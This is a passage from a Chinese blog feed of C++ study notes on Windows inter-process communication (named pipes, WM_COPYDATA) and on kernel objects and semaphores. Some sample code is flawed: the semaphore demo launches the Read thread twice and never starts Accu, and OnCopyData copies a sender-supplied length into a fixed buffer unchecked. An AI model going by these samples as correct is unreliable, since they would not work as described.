FILE_FLAG_OVERLAPPED,</span><br><span class="line">PIPE_TYPE_BYTE, <span class="number">1</span>, <span class="number">1024</span>, <span class="number">1024</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateNamePipe failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;创建命名管道失败&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待客户端的连接</span></span><br><span class="line">HANDLE hEvent = <span class="built_in">CreateEvent</span>(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hEvent)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;创建事件失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">OVERLAPPED ovlap;</span><br><span class="line"><span class="built_in">ZeroMemory</span>(&amp;ovlap, <span class="built_in">sizeof</span>(OVERLAPPED));</span><br><span class="line">ovlap.hEvent = hEvent;</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ConnectNamedPipe</span>(hNamedPipe, &amp;ovlap))&#123;</span><br><span class="line"><span class="keyword">if</span> (ERROR_IO_PENDING != <span class="built_in">GetLastError</span>())&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;等待客户端连接失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">hEvent = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">WaitForSingleObject</span>(hEvent, INFINITE) == WAIT_FAILED)&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;等待对象失败&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hEvent);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line">hEvent = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建命名管道其实也还好，但是为了一些安全考虑，做了一些措施，本质上都是copy来的。</p><p>至于send和recv其实换汤不换药</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//命名管道 服务端 发送</span></span><br><span class="line"><span class="type">char</span> szBuf[] = <span class="string">&quot;This Named Pipe From Server&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;WriteFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeSerDlg::OnBnClickedRecvbtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 服务端 接收</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;ReadFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//接收后显示出来</span></span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说跟之前的一个模样的~</p><hr><h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hNamedPipe;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedConnBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//创建命名管道</span></span><br><span class="line">LPCTSTR szPipeName = <span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\pipe\\mypipe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">WaitNamedPipe</span>(szPipeName,NMPWAIT_WAIT_FOREVER))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;当前没有可以利用的管道&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过打开的命名管道返回的句柄传给hNamedPipe</span></span><br><span class="line">hNamedPipe = <span class="built_in">CreateFile</span>(</span><br><span class="line">szPipeName, GENERIC_READ | GENERIC_WRITE,</span><br><span class="line"><span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hNamedPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="built_in">TRACE</span>(<span class="string">&quot;CreateFile failed with %d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line">hNamedPipe = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比之下，客户端的连接管道就比较简单了。</p><p>然后接收发送一个样都可以直接拷贝前面的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 客户端 发送</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = <span class="string">&quot;Named of Pipe Client&quot;</span>;</span><br><span class="line">DWORD dwWrite;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteFile</span>(hNamedPipe, szBuf, <span class="built_in">strlen</span>(szBuf) + <span class="number">1</span>, &amp;dwWrite, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;WriteFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedRecvBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//命名管道 客户端 接收</span></span><br><span class="line"><span class="type">char</span> szBuf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD dwRead;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hNamedPipe, szBuf, <span class="number">100</span>, &amp;dwRead, <span class="literal">NULL</span>))&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;ReadFile Failed!!!&quot;</span>));</span><br><span class="line"><span class="built_in">CloseHandle</span>(hNamedPipe);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(szBuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>首先肯定是先编译了。</p><img src="/2022/07/21/process/020.png" class=""><p>可以看到在没有建立管道的时候，点击肯定是报错的。</p><img src="/2022/07/21/process/021.png" class=""><p>老样子，点击建立，然后客户端连接之后</p><p>服务器发送 客户端接收</p><img src="/2022/07/21/process/022.png" class=""><p>客户端发送 服务器接收</p><img src="/2022/07/21/process/023.png" class=""><p>ok没啥问题~<br>除非要考到，不然这玩意我是记不住，看看文档差不多了。</p><hr><h2 id="WM-COPUDATA"><a href="#WM-COPUDATA" class="headerlink" title="WM_COPUDATA"></a>WM_COPUDATA</h2><p><code>wParam</code>传递数据的窗口的句柄</p><p><code>COPYDATASTRUCT</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagCOPYDATASTRUCT</span> &#123;</span><br><span class="line">    ULONG_PTR dwData;</span><br><span class="line">    DWORD cbData;</span><br><span class="line">    _Field_size_bytes_(cbData) PVOID lpData;</span><br><span class="line">&#125; COPYDATASTRUCT, *PCOPYDATASTRUCT;</span><br></pre></td></tr></table></figure><p><code>SPY++</code>工具专门用来查找窗口句柄<br>这玩意内置在vs里面了，在顶部工具栏里面</p><img src="/2022/07/21/process/024.png" class=""><p>打开之后就是这么一个东西</p><p>然后点窗口搜索，它可以拖动到指定的窗口去获取句柄</p><img src="/2022/07/21/process/025.png" class=""><p>这里拖到我们的vs22上面，可以看到能看到标题和句柄。</p><p>拿到这样的句柄之后可以进行通信，不过也要能写代码。不然结构不一样它也没有发送接收什么的。</p><p>这里也直接用上面写的修改一下就行了。<br>客户端发送</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CmyNamePipeCliDlg::OnBnClickedSendBtn</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//发送端</span></span><br><span class="line">CString strWinTitle = _T(<span class="string">&quot;服务端&quot;</span>);</span><br><span class="line">CString strMsg = _T(<span class="string">&quot;Client COPYDATA&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用标题获取句柄</span></span><br><span class="line">HWND hwnd = ::<span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, strWinTitle.<span class="built_in">GetBuffer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断句柄有内容还是个窗口</span></span><br><span class="line"><span class="keyword">if</span> (hwnd != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">IsWindow</span>(hwnd))&#123;</span><br><span class="line"><span class="comment">//数据的封装</span></span><br><span class="line">COPYDATASTRUCT cpd;</span><br><span class="line">cpd.dwData = <span class="number">0</span>;</span><br><span class="line">cpd.cbData = strMsg.<span class="built_in">GetLength</span>() * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">cpd.lpData = (PVOID)strMsg.<span class="built_in">GetBuffer</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//1句柄 2消息类型 3主窗口 4copy结构体</span></span><br><span class="line">::<span class="built_in">SendMessage</span>(hwnd, WM_COPYDATA, (WPARAM)(<span class="built_in">AfxGetApp</span>()-&gt;m_pMainWnd),(LPARAM) &amp; cpd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strWinTitle.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">strMsg.<span class="built_in">ReleaseBuffer</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端通过wm_copydata自动接收</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CmyNamePipeSerDlg::OnCopyData</span><span class="params">(CWnd *pWnd, COPYDATASTRUCT *pCopyDataStruct)</span></span>&#123;</span><br><span class="line"><span class="comment">//消息响应之后解析</span></span><br><span class="line">LPCTSTR szText = (LPCTSTR)(pCopyDataStruct-&gt;lpData);</span><br><span class="line">DWORD dwLength = (DWORD)pCopyDataStruct-&gt;cbData;</span><br><span class="line">TCHAR szRecvText[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(szRecvText, szText, dwLength);</span><br><span class="line"><span class="built_in">MessageBox</span>(szRecvText, _T(<span class="string">&quot;Y&quot;</span>), MB_OK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CDialogEx::<span class="built_in">OnCopyData</span>(pWnd, pCopyDataStruct);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个框架是通过编译器造的不用自己敲，里面的实现要自己来<br>右击图形界面，找到类向导打开，消息里面搜索然后双击就出来了</p><img src="/2022/07/21/process/026.png" class=""><p>最后跑一下</p><img src="/2022/07/21/process/027.png" class=""><p>当客户端点击发送的时候，服务端此刻不需要点击接收才能收到消息，而是自动的收到了消息。<br>这种方式可能用的会比较多。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>剪切板比较简单，他和匿名管道一样只能实现同一个机器的两个进程通信，不能跨网络。<br>邮槽基于广播，可以一对多发送，但是只能一个发一个收，要同时进行就要多写点代码。邮槽传输的数据量较小，只能是424字节一下。<br>命名管道和邮槽都可以进行网络通信，命名管道是点对点的单一通信。<br>WM_COPYDATA封装数据和解析数据，使用起来也挺方便，不过数据量比较大的话就建议用命名管道。</p><p>说参数是挺无聊的，但是实现一下也还行。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-续</title>
      <link href="/2022/07/20/thread1/"/>
      <url>/2022/07/20/thread1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>加上代码片段，markdown上一篇写的有点长了，自己都不好理了，还是分开写写吧。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h2><ol><li>内核对象<br>windows中的每个内核对象都是一个内存块，它由操作系统内和分配，并且只能由操作系统内核进程访问，应用程序不能在内存中定位这些数据结构并直接更改其内容。这个内存卡本质上是一个数据结构，其成员维护着与对象相关的信息。<br><code>CreateFile</code><br>如file文件对象，event事件对象，process进程，thread线程，iocompletatinport完成端口，mailslot邮槽，mutex互斥量和registry注册表等</li><li>内核对象的使用计数和生命周期<br>因为所有者是操作系统内核，而非进程，所以说当进程退出，内核对象不一定就被销毁。<br>初次创建内核对象，使用计数为1，当另一个进程获得访问权之后，使用计数+1，当使用计数为0，操作系统内核会主动销毁内核对象。</li></ol><img src="/2022/07/20/thread1/000.png" class=""><ol start="3"><li>操作内核对象<br>通过Create之类的函数构建，成功构建后返回句柄，否则返回NULL。<br>在32位进程中，句柄是一个32位值；在64位进程中，句柄则是一个64位值。</li><li>内核对象和其他类型的对象<br>windows除了内核对象还有，窗口、菜单、字体等对象，但这些属于用户对象和GDI对象。要区分内核对象和非内核对象，最简单的方式就是查看创建这个对象的函数，几乎所有创建内核对象的函数都有一个允许我们指定安全属性的参数。</li></ol><p><strong>注：一个对象是不是内核对象，通常可以看创建次对象API的参数中是否需要<code>PSECURITY_ATTRIBUTES</code>类型的参数</strong></p><p>只有内核对象的引用计数为0时才会销毁。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I am comming....&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread;</span><br><span class="line">HANDLE headle2;</span><br><span class="line">DWORD threadId;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;threadId);    <span class="comment">//创建 引用，内核计数位2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);<span class="comment">//关闭线程句柄，内核计数-1</span></span><br><span class="line"></span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line">headle2 = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, threadId);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h2><p>内核对象的状态：<br>触发状态：有信号状态，表示有可用资源<br>未触发状态：无信号状态，表示没有可用资源</p><ol><li>计数器：该内核对象被使用的次数</li><li>最大资源数量：标识信号量可以控制的最大资源数量(带符号的32位)</li><li>当前资源数量：标识当前可用的资源的数量(带符号的32位)。即表示当前开放资源的个数，注意不是剩下的资源个数。只有开放的资源才能被线程所申请，但开放的资源不一定被线程占用完。<br>比如当前开放5个资源，目前只有3个线程申请，还剩2个可以用。<br>但如果瞬发7个线程就要使用信号量，因为5个开放的资源显然不够用。</li></ol><p>信号量的规则</p><ol><li>如果当前资源计数大于0，那么信号量处于触发状态即有信号状态，表示有可用资源</li><li>如果当前资源计数等于0，那么信号量属于未触发状态即无信号状态，表示没有可用资源</li><li>系统本身绝对不会让当前资源计数变为负数</li><li>当前资源技术也绝对不会大于最大资源计数</li></ol><p><code>CreateSemaphore</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateSemaphoreW</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lInitialCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LONG lMaximumCount,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCWSTR lpName</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CreateSemaphore  CreateSemaphoreW</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>文档详解：</p><img src="/2022/07/20/thread1/001.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HANDLE semOne;</span><br><span class="line"><span class="type">static</span> HANDLE semTwo;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> num;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Read</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">&quot;Input num:&quot;</span>, stdout);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象信号，有信号继续执行没有就等待</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(semTwo, INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begining read\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(semOne, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">Accu</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;begin Accu\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待内核对象semOne的信号，如果有信号继续执行，反之等待</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(semOne, INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;beginning Accu\n&quot;</span>);</span><br><span class="line">sum += num;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, sum);</span><br><span class="line"><span class="built_in">ReleaseSemaphore</span>(semTwo, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result:%d\n&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1, hThread2;</span><br><span class="line">semOne = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//semOne 没有可用资源 只能表示0或1的二进制信号量 无信号</span></span><br><span class="line">semTwo = <span class="built_in">CreateSemaphore</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//semTwo 有可用资源 有信号状态 有信号</span></span><br><span class="line"></span><br><span class="line">hThread1 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = (HANDLE)_beginthreadex(<span class="literal">NULL</span>, <span class="number">0</span>, Read, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread1, INFINITE);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread2, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(semOne);</span><br><span class="line"><span class="built_in">CloseHandle</span>(semTwo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/20/thread1/002.png" class=""><img src="/2022/07/20/thread1/003.png" 